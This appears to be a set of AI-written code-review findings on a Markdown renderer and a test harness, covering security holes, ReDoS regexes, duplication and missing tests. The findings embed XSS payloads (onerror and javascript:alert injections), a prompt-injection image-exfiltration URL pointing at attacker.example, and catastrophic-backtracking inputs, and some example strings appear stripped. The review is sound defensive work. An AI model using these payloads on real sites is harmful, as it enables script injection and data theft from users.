review.fix: In `inline`, strip or escape U+E000 and U+E001 from the input before stashing anything, for example by mapping them to ``. Then add md.test.ts cases: `md("[\uE0000\uE001](/x)")` returns without throwing, and `md("a \uE0000\uE001 `b`")` keeps the literal characters and does not render a `<code>` that wasn't in the text.

review.impact: The codeBlock tests only use plain tags such as zsh and cobol. Nothing checks that markup in a fence tag is escaped in the corner label, though FENCE_OPEN accepts characters like `<` and `"` in the tag. If someone removed the `escapeHtml` call on the label, every test would still pass.
review.fix: Add a case such as `codeBlock("x", "")`, expecting `<b>` and no `data-grammar` attribute.

review.impact: The stash placeholders are made from the private-use characters U+E000 and U+E001. escapeHtml does not change these characters, so card text, notes or chat messages can contain forged placeholders. restore() expands every placeholder recursively wherever it appears, including inside attribute values. Take the input `![\uE0001\uE001](/nope) [y](/x/onerror=location='javascript:alert%281%29'//)`. The link's own HTML gets pasted into the image's alt="...". Its quotes then close the alt attribute, and the href turns into an unquoted onerror attribute. The browser decodes the ' entities back into quotes, so the script runs when /nope fails to load. This is stored XSS from any card or chat text, including text written by a model.
review.fix: Do not let input forge a placeholder. Before escaping, strip U+E000 and U+E001 from the input, or replace them with entities. Another option is a per-call random nonce in the placeholder. In restore(), also expand only indices that were actually created, and only where keep() put them. Never expand a placeholder that ends up inside an attribute value.

review.impact: The image alt text goes inside alt="..." with its stash placeholders unresolved. restore() then expands them into raw HTML inside the attribute. A plain code span naming a known card, such as ![`al-diff`](/x), turns into refLink HTML with double quotes in the middle of the alt attribute. That breaks the img tag and pours markup into the attribute context. No special characters are needed to cause this. It is also the opening that the placeholder forgery above uses.
review.fix: Make the alt plain text before it goes into the attribute. Put stashed pieces back as their plain text, or remove placeholders from alt, then escape the result again. Alternatively, skip stashing code spans for image alt text, as asLabel does for link labels.

review.impact: charBefore copies the whole prefix of the text (escaped.slice(0, offset)) for every token that REF matches, then runs endsWith on that copy once per entity. Run time therefore grows with tokens × line length, which is quadratic in the length of one prose line. A long single-line chat reply or pasted log, re-rendered on every streamed chunk, does megabytes of string copying per render.
review.fix: Look only at the last few characters. The longest entity is 6 characters ('"'), so use `const before = escaped.slice(Math.max(0, offset - 6), offset);`. The result stays the same and the cost per token becomes constant.

review.impact: The emphasis patterns (`\*\*(?=\S)([\s\S]*?\S)\*\*`, the `__` and `~~` variants, and the single `*`/`_` forms) scan lazily to the end of the line from every unmatched opener. A line with many unclosed `**`, `~~` or `__` takes quadratic time. The link and image patterns behave the same way on many `[` with no `]`. Each run is limited to one line, so the cost is small for normal card text.
review.fix: Optionally, find the delimiters in one linear pass and pair them, or stop the inner class at the delimiter character, e.g. `\*\*(?=\S)((?:[^*]|\*(?!\*))*?\S)\*\*`. Another option is to cap the length of the line before the inline rules run.

causeOfLast.why: the earlier pass made its placeholders from characters that the input can hold, and it never treated attribute values as plain text, although the ticket requires safe HTML.

grade.gap: I could not confirm the coverage numbers because the sandbox would not let me run `make test-coverage`. From reading the code: web/escape.ts, web/highlight.ts, web/md.ts and web/reflink.ts each have their own test file and are listed in pure-files.txt, and those tests reach nearly every branch.

This passes. One minor point: renderTileInline in web/md.ts (shows a reference in a tile as an unlinked #id label) is not asked for by any criterion. The #werk-reflink card only says a tile summary must not hold a link. The block Markdown in md.ts (headings, lists, quotes, rules, emphasis, images) is the base that card text renders on, and the safe-links card depends on it, so it is in scope.

The box styles are in web/md.css, but the card names web/style.css. The behaviour matches the card: a box that scrolls sideways, with json, js, ts and bash highlighted. The diff does not load md.css anywhere, which is left to a later ticket.

review.impact: `ENTITIES` is exported, but no other module uses it. `escapeHtml` and `entityCharAtEnd` are the module's whole interface. Exporting the mutable-looking table invites callers to build their own escaping from it, which would undo the point of having one shared escape table.
review.fix: Stop exporting `ENTITIES` and keep it private to `escape.ts`.

review.impact: `inline` reassigns its `escaped` parameter, then runs code spans, images, links, references and emphasis in one closure that shares `stash`, `plainCode`, `keep` and `asLabel`. The order of those passes matters for safety (the placeholders and the `\uE000` check in `isSafeUrl`), but nothing in the code's structure enforces that order. This makes it the hardest part of the renderer to change safely.
review.fix: Bind the result of the `MARKS` replace to a new local instead of reassigning the parameter. Then split the steps into named helpers that take the stash explicitly, for example `stashCode`, `stashImages`, `stashLinks` and `stashRefs`. Keep one short comment that says why the passes must run in that order.

review.impact: The block patterns don't agree on indentation. `HEADING` allows no leading spaces, while `FENCE_OPEN`, `RULE` and `QUOTE` allow up to three, and `BULLET` and `NUMBERED` allow any amount. As a result, `'  # Title'` renders as a paragraph and `'  - x'` renders as a list. `isParagraphLine` repeats the whole list of block patterns, so the two places can drift apart when a new block type is added.
review.fix: Give `HEADING` the same `^ {0,3}` prefix as the other block patterns. Keep the block patterns in one array that both the dispatcher and `isParagraphLine` read, so a new block type is added in one place.

review.impact: Nothing in the change loads the stylesheet, and its colours are hard-coded hex values instead of the theme tokens that the shadcn/ui client will use (#werk-stack-ui). Code boxes and tokens won't follow the app theme, such as dark mode, once a client imports them.
review.fix: Write the colours as CSS variables, or map them onto the shadcn theme variables (`--muted`, `--border`, `--muted-foreground` and so on). Import `md.css` from the module or component that renders `renderMarkdown` output, so the styles go wherever the markup goes.

review.impact: `.tok-key` sets the same colour (#0550ae) as `.tok-num, .tok-lit` in a separate rule. Likewise `.ref code` appears in two rules (lines 18 and 55). Anyone changing a colour or the monospace face has to find and edit two places, and the two can drift apart.
review.fix: Merge `.tok-key` into the `.tok-num, .tok-lit` selector list, and put `.ref code`'s font-size in the same rule as its font-family, or keep both `.ref code` declarations in one rule.

review.impact: `codeBlock` calls `grammarFor(tag)` and `tag.trim()` itself, and then `highlight(code, tag)` looks up the grammar again. The tag-to-grammar step is spread over two functions, so a change to how tags are normalised has to be made in both.
review.fix: Pull out an internal `highlightWith(code, grammarName)` that both `highlight` and `codeBlock` call. `codeBlock` then resolves the name once and passes it in, and trims the tag once into a local.

review.impact: The JSON `key` pattern copies the body of `STRING_DQ` (`"(?:\\.|[^"\\\n])*"`), so a fix to string escaping has to be repeated in it.
review.fix: Build both patterns from one shared source string, e.g. `const DQ_BODY = String.raw`"(?:\\.|[^"\\\n])*``, then `new RegExp(DQ_BODY + '"?', 'y')` for strings and `new RegExp(DQ_BODY + '"(?=\\s*:)', 'y')` for keys.

review.impact: `item[item.length - 1]` picks the item text from either BULLET (one group) or NUMBERED (two groups) by position. This is easy to break: adding a capture group to either regex silently changes what gets rendered. Line 106 also runs `NUMBERED.exec(line)` a second time after line 104 has already tested it.
review.fix: Use named groups (`(?<text>.*)` in both regexes, and `(?<n>\d+)` in NUMBERED), then read `item.groups?.text`. Run NUMBERED once and reuse that match for the start number.

review.impact: Nothing imports the `KnownIds` re-export, and nothing outside `escape.ts` imports `ENTITIES` (web/escape.ts:5). Both widen the public surface with no user.
review.fix: Drop the re-export, and stop exporting `ENTITIES`, until a caller needs them.

review.impact: The fence tag is printed into the corner label, and nothing tests that it is escaped. FENCE_OPEN accepts any run of non-space, non-backtick characters as the tag, so a fence like ```<img/src=x/onerror=alert(1)> reaches codeBlock. If escapeHtml were dropped from the label, it would inject markup and every test would still pass.
review.fix:
Add a test that the label escapes the tag, e.g. expect(codeBlock("x", "")).toBe('
<b>
x
'). Add the same check end to end in md.test.ts with md("```\nx\n```").

review.impact: Link hrefs and image src/alt go inside double-quoted attributes, but no test puts a double quote in an address or an alt. The safety rests only on the text being escaped earlier. If inline() ever ran on unescaped text, or the escape order changed, an address like /a"onmouseover=alert(1) could break out of the attribute and no test would fail. The existing attack test only uses single quotes.
review.fix: Add a test that md('[x](/a"onmouseover=alert(1)) ![a"b](/p.png)') renders href="/a"onmouseover=alert(1)" and alt="a"b", so the quote stays inside the attribute.

review.impact: The shell comment rule's lookbehind is meant to keep the special variable $# from being read as a comment, but nothing tests it. Also untested: an unterminated string or block comment in a fence that is still streaming. These are the cases where a regex change would most likely regress without anyone noticing.
review.fix: Add expect(highlight("echo $#", "sh")).toContain('$#') and check it has no tok-com. Add a streaming case such as highlight('"abc', "ts") and highlight("/* open", "ts"), asserting that each becomes one tok-str or tok-com span.

review.impact: The list loop stops when the line style changes, but no test covers a bullet list directly followed by a numbered list. The same goes for a list item whose text holds a card reference. A regression in splitting adjacent lists would go unnoticed.
review.fix:
Add a test that md("- a\n1. b") renders as two lists:
  • a
and then
  1. b
. Add a test that md("- al-diff") puts the ref link inside the
  • .

review.impact: Each leading '>' makes blocks() call itself one level deeper, with no limit. Card text or a streamed chat reply with thousands of nested '> ' markers on one line could exceed the JS call stack, so renderMarkdown would throw and the card or message would fail to render. The text comes from the map or the model, so this is an availability problem only, not an injection. I reasoned this from the code and did not run it.
review.fix: Pass a depth to blocks() and stop at a small limit (for example 8). Past that limit, render the remaining quote markers as escaped paragraph text instead of nesting another blockquote.

review.impact: HEADING (`^(#{1,6})\s+(.*?)\s*#*\s*$`) backtracks polynomially. The lazy `.*?` is followed by `\s*#*\s*`, and the two `\s*` can split the same whitespace run in many ways. Take a line that starts `# ` and holds a long whitespace run, or spaces, then `#`, then more spaces, ending in a non-space character. For each length of `.*?`, the engine tries every split of the trailing whitespace, so the cost grows as O(n^3) in the line length. A few thousand spaces in one heading line of card text, a note or a streamed chat reply would freeze the page while it renders, and again on each re-render. I worked this out from the regex; I could not run a timing test because the sandbox blocked the command.
review.fix: Make the tail of the pattern unambiguous. Trim the line first, then match `^(#{1,6})\s+(.*?)(?:\s+#+)?$` on the trimmed text. Or match `^(#{1,6})\s+(.*)$` and strip a closing `#` run with a separate `.replace(/\s+#+$/, "")`.

review.impact: The emphasis rules (`\*\*(?=\S)([\s\S]*?\S)\*\*`, and the same shape for `__` and `~~`) scan lazily to the end of the text from every opening marker that never closes. A line with many unclosed `**` markers, such as `**a **a **a …`, therefore costs O(n^2) per line. The input is one line at a time, so this is bounded, but a long pasted line still renders slowly.
review.fix: Keep the content from crossing another opening marker, for example `\*\*(?=\S)((?:[^*]|\*(?!\*))*?\S)\*\*`. Or cap the length of a line that emphasis runs on.

review.impact: In FENCE_OPEN (`^ {0,3}```\s*([^\s`]*)[^`]*$`), the `\s*` overlaps with `[^`]*`. A line made of ``` ``` ```, a long run of spaces and a final backtick backtracks in O(n^2). This pattern runs on every line of the text.
review.fix: Drop the overlap: match `^ {0,3}```([^`]*)$` and read the tag as the first word of the captured text after trimming it.

web/md.ts:163-174: an unsafe link or image is returned as the matched text, but the later emphasis() and linkRefs() passes still rewrite inside it. For example, `[**run**](javascript:x)` renders <strong>, so the text is not 'exactly as written'. Stash the refused span with keep() so no later rule touches it.

Minor: src/test/project.ts freshProject also creates a second git repository, `target`, next to the project. No criterion asks for it. #werk-test-fake-edit-inside-cwd motivates it, so it is kept. Nothing else is out of scope.

review.impact: Two modules parse `launches.jsonl`: `readLaunches` here and `earlierLaunches` in `src/test/fake-agent.ts:55`. If the record format changes, both readers must be updated, and the reader that is missed will drift without any error. Both readers also run outside the pure module, so the 90% coverage gate never checks them.
review.fix: Add one pure `parseLaunches(text): Launch[]` function to `fake-script.ts`, next to `LaunchEntry`, and give it a test. Have both the harness and the fake agent call it, and have the fake count the launches for its role from the result.

review.impact: `edit` checks containment three times. The second check appends a dummy `"x"` segment so that `insideProject` accepts the project root itself. The rule this enforces is hard to see, and a later edit could easily break it. The containment logic is also split between the pure `insideProject` and inline `realpath` handling here.
review.fix: Move the `realpath`-aware containment check into one helper, such as `resolvesInside(root, target)`, that compares the real path of the nearest existing ancestor and of the target against `root` directly. Have `edit` call that helper once.

review.impact: The fake agent runs whatever `bun` comes first on `PATH`, not the Bun binary that is running the tests. The repository pins one Bun version (#werk-devex-toolver), but the fake could still run on a different one.
review.fix: In `setup.ts`, export the running binary's path (`process.execPath`) in a variable such as `FAKE_AGENT_BUN`. Change the wrapper to `exec "${FAKE_AGENT_BUN:-bun}" ...`, or make `cleanEnv` put the directory of `process.execPath` right after the fake's directory on `PATH`.

review.impact: The wrappers around `Bun.spawn` and `Bun.spawnSync` use `unknown` arguments and `as never` casts. This removes type checking from every spawn call in the test run, so a misuse of the wrapper, or a change to Bun's signatures, would compile without any error.
review.fix: Type the wrappers with `Parameters<typeof Bun.spawn>` and `Parameters<typeof Bun.spawnSync>`, or with overloads. That way the replaced functions keep Bun's own signatures and need no `as never`.

review.impact: Two places parse the launch record (launches.jsonl): `readLaunches` here and `earlierLaunches` in src/test/fake-agent.ts:55. Each does its own split, empty-line filter, `JSON.parse(...) as LaunchEntry` cast and filter on `kind`. If the record format changes, both copies must change together, and the copy in fake-agent.ts is not covered by the pure-file coverage gate.
review.fix: Add a pure `parseLaunches(text): LaunchEntry[]` (or a function that returns grouped `Launch[]`) to src/test/fake-script.ts and test it there. Then build `readLaunches` and `earlierLaunches` on top of it.

review.impact: `edit()` repeats `fail(`the edit ${path} leads outside the project`)` three times. The second check also appends a dummy segment "x", only because `insideProject` rejects the root itself. That trick is hard to follow.
review.fix: Collect the three conditions into one boolean, or a small `escapes(path)` helper, and call `fail` once. Better still, add a pure `withinRoot(root, realPath)` to fake-script.ts that accepts the root itself, so the "x" suffix is no longer needed.

review.impact: The wait loop `while (...) await new Promise<void>((wake) => (wakeReader = wake))` appears twice, in `nextMessage` and in `play`. Both copies use the same single `wakeReader` slot, so the coupling between them is implicit.
review.fix: Pull out a helper `waitUntil(done: () => boolean)` that holds the wake logic, and call it from both places.

review.impact: Both branches of the chat and non-chat split end with the same `process.exit(own?.exit ?? 0)`. That is duplicated control flow.
review.fix: Remove the call from each branch and make one `process.exit(own?.exit ?? 0)` after the if/else.

review.impact: The wrappers for Bun.spawn and Bun.spawnSync use three `as never` casts and one `as Options` cast. These turn off type checking on the overloads that are being patched, so if Bun's spawn signature changes, the compiler will not report it.
review.fix: Type the wrappers with `Parameters<typeof Bun.spawn>` (or the overload signatures) and cast once to `typeof Bun.spawn` at the assignment. Do not use `never` at every call site.

review.impact: `FAKE_BIN` is exported but nothing imports it. src/test/setup.test.ts:6 builds the same path again by hand. `Project.env` (src/test/project.ts:27) is also exposed on the returned object and no caller reads it. This is dead API surface.
review.fix: Stop exporting `FAKE_BIN`, and remove `env` from the `Project` type and the returned object until a test needs it.

review.impact: The `test.failing` case and the test after it depend on each other through the module-level `left` variable. If the second test runs alone, for example with `-t` filtering, it throws 'the failing test did not run', and the reason is not obvious.
review.fix: Put the two tests in a `describe` block with a comment that they must run in order, or check cleanup inside one test by calling `removeProjects()` directly.

review.impact: The path check misses a dangling link. `existsSync` follows links, so for a link inside the project that points at a missing file outside it, `existsSync(target)` is false and the real-path check on the target is skipped. The parent folder is inside the project, so that check passes too. `writeFileSync` then follows the link and creates the file outside the project. This breaks #werk-test-fake-edit-inside. No test covers a link as the edit target: the only link test links a folder, so this branch never runs in a test.
review.fix: Check the target with `lstatSync` (wrapped in try/catch). When the target is a link, resolve it with `readlinkSync` against its folder and reject the edit if the result is outside the project. Add a test that runs `ln -s ../outside.txt project/link`, scripts an edit of `link`, and asserts exit code 1 and that `outside.txt` does not exist. Add a second case where `outside.txt` already exists, to cover the existing-target branch.

review.impact: The link test checks only the exit code and that the file is absent. It ignores `run.err` and the result of the `ln` command, so the test still passes if the edit fails for an unrelated reason, such as a script parse error or a failed `ln`.
review.fix: Assert that the `ln` run returns code 0, and that `run.err` contains `the edit up/outside.txt leads outside the project`.

review.impact: The clean environment drops only five GIT_ variables. Git also reads its config, hooks and object locations from other variables: GIT_CONFIG_PARAMETERS, GIT_CONFIG_COUNT with GIT_CONFIG_KEY_n and GIT_CONFIG_VALUE_n, GIT_OBJECT_DIRECTORY, GIT_ALTERNATE_OBJECT_DIRECTORIES, GIT_NAMESPACE and GIT_QUARANTINE_PATH. Git sets some of these when it runs a hook, and a person may set them in their shell, so they reach every child git. That defeats the stated aim that git reads no configuration of the person who runs the tests, which can mean signed commits or running core.hooksPath hooks. In a hook context it can also point a test's git at the real repository's objects (#werk-test-external).
review.fix: Treat every name that starts with GIT_ as pointing at a real project: `name.startsWith("WERK_") || name.startsWith("GIT_") || name === "CLAUDE_PROJECT_DIR"`. Then set GIT_CONFIG_GLOBAL and GIT_CONFIG_NOSYSTEM after the filter, as the code already does. Add a test case for GIT_CONFIG_PARAMETERS and GIT_CONFIG_COUNT.

review.impact: All other variables pass through unchanged to every test and every child process, including credentials such as ANTHROPIC_API_KEY, GITHUB_TOKEN and GH_TOKEN, and HOME. If code under test calls an SDK or `gh` directly, or runs `claude` by an absolute path, it reaches a real external service with the real credentials of the person who runs the tests. It can also read their real ~/.claude data. #werk-test-external forbids both.
review.fix: Remove known credential variables, or better, keep only an allowlist such as PATH, TMPDIR, LANG and TERM. Point HOME (and XDG_CONFIG_HOME) at an empty temporary folder for the run.

review.impact: The check that an edit stays inside the project misses a dangling symlink. If the target path is a link to a file outside the project that does not exist yet, `existsSync(target)` returns false, so the realpath check is skipped. `writeFileSync` then follows the link and creates the file outside the project, which #werk-test-fake-edit-inside rules out.
review.fix: Check the target with `lstatSync` (in a try block). If it is a symbolic link, resolve it with `readlinkSync` against its folder, and refuse the edit when the result leads outside the project. Alternatively, open the file with `O_NOFOLLOW`. Add a test with a dangling link.

review.impact: Each fresh project runs six blocking git processes in sequence: an init and two config calls for each of the two repositories. Every test that calls freshProject pays for this on the worker's thread, so it adds up across the suite on the shared parallel workers. The 'each test gets its own project' test pays for it twice.
review.fix: Run one process per repository: `git -c init.defaultBranch=main init --quiet` and then append the user.name and user.email lines straight to `.git/config` with appendFileSync. Or set GIT_AUTHOR_NAME, GIT_AUTHOR_EMAIL, GIT_COMMITTER_NAME and GIT_COMMITTER_EMAIL in the project's env instead of writing the repository config.

review.impact: `refLink` and `refLabel` are exported and put `id` straight into an href and into element text without escaping it. Both are safe only because today's callers pass ids that already matched ID_PATTERN. Any new caller that passes an id from somewhere else, such as a route parameter or map data, would write raw HTML. That breaks the module's promise of safe HTML out. `cardHref` encodes the id, but the `#${id}` label does not.
review.fix: Pass the label through `escapeHtml(id)` in `refLink` and `refLabel`. This also makes the functions safe to use on their own.

review.impact: `isSafeUrl` checks for the literal `\uE000`, separately from the PLACEHOLDER and MARKS constants that define the stash marks. If the placeholder encoding changes, this guard silently stops matching, and stashed HTML could reach an attribute.
review.fix: Define the open and close marks once (e.g. `const OPEN = "\uE000"`) and build PLACEHOLDER, MARKS, `keep()` and `isSafeUrl` from those constants, or test against MARKS.

review.impact: `ENTITIES` is exported, but only this module uses it. Its export makes the entity table part of the public surface, so other modules can couple to the escaping internals.
review.fix: Stop exporting `ENTITIES`. Keep `escapeHtml` and `entityCharAtEnd` as the module's whole interface.

review.impact: No module or entry imports md.css, and nothing in the client imports md.ts yet. The stylesheet is dead until something wires it in, and the build never checks that its class names (`codebox`, `tok-*`, `ref`) stay in step with highlight.ts and reflink.ts.
review.fix: Import md.css from whichever module or component renders the Markdown, ideally next to md.ts, so the styles and the HTML that uses them arrive together.

review.impact: `codeBlock` resolves the grammar with `grammarFor(tag)`, then `highlight` resolves it again from the raw tag. The two lookups can drift apart, so the `data-grammar` label could disagree with the grammar actually applied.
review.fix: Split out an internal `highlightWith(code, name)` that takes the already-resolved grammar name, and call it from both `highlight` and `codeBlock`.

review.impact: isParagraphLine repeats every block test that blocks() already runs: HEADING, RULE, QUOTE, BULLET and NUMBERED. If someone adds a block type (a table, say) to blocks() but not here, paragraph lines will swallow the new block's lines, and no test will catch it.
review.fix: Keep the block-start patterns in one list, e.g. const BLOCK_STARTS = [HEADING, RULE, QUOTE, BULLET, NUMBERED], and build isParagraphLine from it: line.trim() !== "" && !BLOCK_STARTS.some((re) => re.test(line)).

review.impact: The list branch tests BULLET and NUMBERED, runs NUMBERED.exec on the same line again for the start number, and takes the item text with item[item.length - 1] because the two patterns have different numbers of capture groups. The code is harder to read than it needs to be, and it breaks quietly if either pattern gains a group.
review.fix: Run each pattern's exec once and give the item text a named group, e.g. (?<text>.*), in both BULLET and NUMBERED. Read item.groups.text and the start number from that single exec.

review.impact: .tok-key has its own rule with the same colour as .tok-num and .tok-lit (#0550ae). The .ref code selector also sits in two rules, at lines 18 and 55. Changing one shared colour or the reference style means editing two places.
review.fix: Put .tok-key in the .tok-num, .tok-lit rule. Move font-size: 0.9em into one .ref code rule, or keep the shared font-family rule for .codebox code only and give .ref code a single rule of its own.

review.impact: No module, page or build entry imports the stylesheet, so the codebox, token and .ref classes that the renderer emits have no styles until something wires them in. As it stands, the file is dead code that nothing checks.
review.fix: Import md.css from the client entry or component that renders card text, or leave it out until that consumer lands.

review.impact: ENTITIES is exported but nothing outside escape.ts uses it, which makes the public surface wider than it needs to be.
review.fix: Remove the export so it is a module-private const.

review.impact: The JSON key pattern copies the body of STRING_DQ with a lookahead added. A fix to string escaping in one pattern will not reach the other.
review.fix: Build the key pattern from a shared source string, e.g. const DQ_BODY = String.raw`"(?:\\.|[^"\\\n])*`. Then STRING_DQ is new RegExp(`${DQ_BODY}"?`, "y") and the key is new RegExp(`${DQ_BODY}"(?=\\s*:)`, "y").

review.impact: No test puts markup in a fence tag. The tag goes into the HTML as the `codebox-tag` label, and md.ts's FENCE_OPEN accepts any characters in a tag except whitespace and backticks, so a fence like ```<img/src=x/onerror=alert(1)> is valid. If someone dropped the `escapeHtml(tag.trim())` call in `codeBlock`, every test would still pass and card text could put raw HTML on the page.
review.fix:
Add a test such as `expect(codeBlock("x", "")).toBe('
<b>
x
')`, and an md.test.ts case that passes the same tag through a fence.

review.impact: The grammars deliberately make the closing quote, backtick and `*/` optional (`"?`, `'?`, `` `? ``, `(?:\*\/|$)`) so that a fence that is still streaming highlights correctly. No test covers an unclosed string or block comment. If a later change made the closer required, a half-streamed string would be coloured wrongly and no test would fail.
review.fix: Add cases such as `expect(highlight('x = "ab', "ts")).toContain('"ab')` and `expect(highlight("/* open", "ts")).toBe('/* open')`.

review.impact: Only the `$name` form of a shell variable is tested. The `${...}` and special-parameter forms (`$?`, `$1`, `$@`) in the `var` rule have no test, so a regression in those branches would go unnoticed.
review.fix: Assert that `highlight('echo ${HOME} $? $1', 'sh')` contains `tok-var` spans for `${HOME}`, `$?` and `$1`.

review.impact: The renderer turns `![alt](https://…)` into an `` for any http(s) address, and it renders chat messages and notes as well as card text. The browser loads such an image as soon as the message is rendered, with no click. If a prompt injection gets a model reply to include `![](https://attacker.example/?d=)`, the data in that address leaves the user's machine. Rendering a model's Markdown images is a known way to leak data out of an LLM tool.
review.fix: Only build `` for same-origin addresses (starting with `/` but not `//`, or `.`). Render an external image address as a plain link or as text. Also check that SAFE_URL's `/` branch does not allow protocol-relative `//host` addresses for images.

review.impact: HEADING `^(#{1,6})\s+(.*?)\s*#*\s*$` has three whitespace parts that can match the same characters: `\s+`, the lazy `.*?` and the two `\s*` around `#*`. A heading line with a long run of spaces before a final non-space character (e.g. `# a` + 5000 spaces + `x`) makes the regex backtrack polynomially, and from reading the pattern I expect cubic time or worse. `isParagraphLine` runs this regex on every line, and a streaming reply is rendered again on every chunk, so one such line in card text or model output can freeze the browser tab. I could not time it here because running a timing command needed approval.
review.fix: Remove the overlap. For example, match `^(#{1,6})[ \t]+(.*)$`, then strip the trailing `#` run and whitespace from the capture with string operations or a non-overlapping regex such as `/(?:[ \t]+#+)?[ \t]*$/`. Add a test that times a long run of spaces on a heading line.

review.impact: The emphasis regexes (`\*\*(?=\S)([\s\S]*?\S)\*\*`, `__…__`, `~~…~~`, and `\*([^\s*](?:[^*]*?[^\s*])?)\*`) scan to the end of the text for each opening marker that has no closing one. That is O(n²) on input such as many `**a ` repeats. `renderTileInline` joins the whole text into one line, so a long card body can make tiles render slowly.
review.fix: Limit the scan, for example by stopping the lazy body at a newline or with a length cap, or find the delimiters in a single pass instead of with backtracking regexes.

review.impact: The bold, double-underscore and strikethrough rules use a lazy `[\s\S]*?` that can run to the end of the line. On a line with many openers and no matching closer (for example `**a **a **a …`), every opener scans the rest of the line, so the work grows with the square of the line length. Chat replies are rendered again as they stream, so the cost is paid again each time the text updates.
review.fix: Bound each body so it cannot cross its own delimiter, as the italic rules already do. For example, use `\*\*(?=\S)((?:[^*]|\*(?!\*))*?\S)\*\*` for bold, and the same shape for `__` and `~~`. Or find the delimiters in one linear scan and pair them up.

review.impact: In HEADING, the lazy `(.*?)` is followed by `\s*#*\s*$`. The two `\s*` groups can split a run of spaces in many ways, so a heading line with a long run of spaces that does not end the line (`# a` + 2000 spaces + `x`) backtracks with cubic cost. isParagraphLine runs this test again on every line.
review.fix: Capture the heading greedily with `^(#{1,6})\s+(.*)$`, then remove the closing #s and spaces with `.replace(/\s+#*\s*$|\s*#+\s*$/, '')` or a manual trim from the end. Or make the closing part possessive, for example `(?:\s+#+)?\s*$`.

review.impact: The link and image patterns `\[([^\]]+)\]\(` restart at every `[`. In a line with many `[` and no `](`, each start scans forward to the next `]`, so the cost grows with the square of the line length.
review.fix: Exclude `[` from the label class (`[^\[\]]+`) so that each attempt stops at the next bracket. That also matches how the label is meant to nest.

review.impact: charBefore takes `escaped.slice(0, offset)` for every token that might be a reference, and entityCharAtEnd then runs five `endsWith` checks on that slice. This is a prefix copy for each token; whether it is cheap depends on the engine's substring sharing. At worst it makes linkRefs quadratic on long prose.
review.fix: Look back only the length of the longest entity, with `escaped.slice(Math.max(0, offset - 6), offset)`. Or test only whether `escaped[offset - 1] === ';'` before checking for an entity.

grade.gap: Restore is correct in the path that was tested. One fault remains: src/board/fold.ts, case "ticket.archived", replaces ticket.reason with the archive's reason. review.impact: The fence test makes only a negative check: the output must not contain "<a". It would still pass if the renderer dropped the fence body, returned an empty string, or mangled the `#al-diff al-diff` line. That means it does not show that the reference survives as plain code, which is what the test's name claims. Highlighted tags like `ts` and `zsh` may wrap tokens in spans, which is why an exact match is harder here, but the test checks nothing positive at all.

For example, strip the tags and expect the result to contain `#al-diff al-diff`. For the untagged and `cobol` cases, assert the exact output, as the other fence tests do.

review.impact: No test covers the new `min-width: 0` / `max-width: 100%` rule, which keeps a wide code box inside its page. If someone removes or overrides it, nothing fails. The commit message admits the browser half is deferred to other tickets.

It should assert that the box's width is no more than the parent's and that the box scrolls sideways (scrollWidth > clientWidth).
